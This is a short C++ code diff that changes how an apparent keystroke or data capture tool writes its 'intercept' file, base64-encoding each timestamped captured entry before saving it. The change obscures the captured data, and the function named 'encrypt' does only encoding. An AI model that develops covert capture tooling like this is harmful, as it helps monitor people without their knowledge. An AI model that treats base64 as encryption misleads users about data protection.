@@ -6,6 +6,7 @@
 #include <fstream>
 
 #include "date_time.h"
+#include "base64.h"
 
 using namespace std;
 
@@ -79,9 +80,7 @@ namespace file_handler
             write_logs("Can't create/open intercept file --> " + get_full_path());
             return false;
         }
-        file << "<<" << date_time::get_date_time() << ">>\n"
-             << captured << "\n";
-
+        file << base_64::encrypt("<<" + date_time::get_date_time() + ">>\n" + captured + "\n") << "\n";
         file.close();
         write_logs("Successfully wrote intercept");
         return true;
